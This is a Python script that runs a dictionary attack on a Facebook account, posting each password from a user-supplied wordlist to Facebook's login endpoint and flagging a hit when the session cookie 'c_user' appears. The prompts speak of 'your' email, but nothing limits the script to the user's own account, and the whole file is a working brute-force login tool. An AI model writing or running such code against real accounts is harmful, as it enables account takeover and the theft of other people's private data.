#!/usr/bin/env python3
import requests
import getpass

def test_passwords(email, password_file):
    success = False
    try:
        with open(password_file, 'r') as f:
            for password in f:
                password = password.strip()
                if not password:
                    continue
                # POST request to Facebook login page
                payload = {
                    "email": email,
                    "pass": password
                }
                response = requests.post("https://www.facebook.com/login.php", data=payload)
                
                # Check if login failed (Facebook returns 200 even if failed)
                if "c_user" in response.cookies:
                    print(f"[✅ SUCCESS] Password works: {password}")
                    success = True
                    break
                else:
                    print(f"[❌ FAIL] Wrong password: {password}")
    except FileNotFoundError:
        print(f"[❌ ERROR] Password file '{password_file}' not found.")
    
    if not success:
        print("[⚠️] No valid password found.")

# ===========================
# User input
# ===========================
email = input("Enter your Facebook email: ").strip()
password_file = input("Enter path to your password file: ").strip()

test_passwords(email, password_file)
